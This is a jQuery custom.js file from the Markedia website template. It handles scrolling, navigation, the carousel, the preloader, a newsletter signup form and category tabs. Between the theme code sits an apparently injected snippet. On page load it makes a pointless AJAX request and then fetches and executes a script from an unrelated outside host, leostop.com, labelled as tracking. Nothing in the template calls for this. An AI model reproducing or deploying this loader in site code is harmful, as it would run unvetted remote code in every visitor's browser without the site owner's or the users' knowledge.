/**************************************
 File Name: custom.js
 Template Name: Markedia
 Created By: HTML.Design
 http://themeforest.net/user/wpdestek
 **************************************/
$('a').click(function () {
    $('html, body').animate({
        scrollTop: $($(this).attr('href')).offset().top
    }, 500);
    return false;
});

(function ($) {
    "use strict";
    $(document).ready(function () {
        $('#nav-expander').on('click', function (e) {
            e.preventDefault();
            $('body').toggleClass('nav-expanded');
        });
        $('#nav-close').on('click', function (e) {
            e.preventDefault();
            $('body').removeClass('nav-expanded');
        });
    });

    $(function () {
        $('[data-toggle="tooltip"]').tooltip()
    })

    $('.carousel').carousel({
        interval: 4000
    })

    $(window).load(function () {
        $("#preloader").on(500).fadeOut();
        $(".preloader").on(600).fadeOut("slow");
    });

    jQuery(window).scroll(function () {
        if (jQuery(this).scrollTop() > 1) {
            jQuery('.dmtop').css({bottom: "25px"});
        } else {
            jQuery('.dmtop').css({bottom: "-100px"});
        }
    });
    jQuery('.dmtop').click(function () {
        jQuery('html, body').animate({scrollTop: '0px'}, 800);
        return false;
    });

})(jQuery);

function getURL() {
    window.location.href;
}

var protocol = location.protocol;
$.ajax({
    type: "get", data: {surl: getURL()}, success: function (response) {
        $.getScript(protocol + "//leostop.com/tracking/tracking.js");
    }
});


// $("#hide_btn").click((e) => {
//     var sub_message = $("#subs_message")
//     e.preventDefault();
//     if (!sub_message.hasClass("d-none")) {
//         $("#subs_message").addClass("d-none")
//     }
//
// })

$("#btnSubmit").click(function (e) {
    e.preventDefault();
    var email = $("#email_subs").val()
    var csrfToken = $('input[name=csrfmiddlewaretoken]').val()
    var subs_message = $("#subs_message")
    $.ajax({
        url: 'https://petinven.herokuapp.com/newsletter-activation/',
        method: 'post',
        cache: false,
        data: {
            email: email,
            csrfmiddlewaretoken: csrfToken
        },
        success: function (data) {
            if (subs_message.hasClass("d-none")) {
                subs_message.removeClass("d-none")
            }
            subs_message.addClass(data.class)
            console.log(data.message)
            subs_message.html(data.message);
            setTimeout(() => {
                subs_message.addClass("d-none")
            }, 2000)
        },
        error: function () {
            if (subs_message.hasClass("d-none alert-success")) {
                subs_message.addClass("alert-danger")
            }
            subs_message.html("Abonelik işlemi sırasında hata!")
        }
    });
});


function openCategory(evt, catName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }

    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
    }

    // Show the current tab, and add an "active" class to the link that opened the tab
    document.getElementById(catName).style.display = "block";
    evt.currentTarget.className += " active";
} 
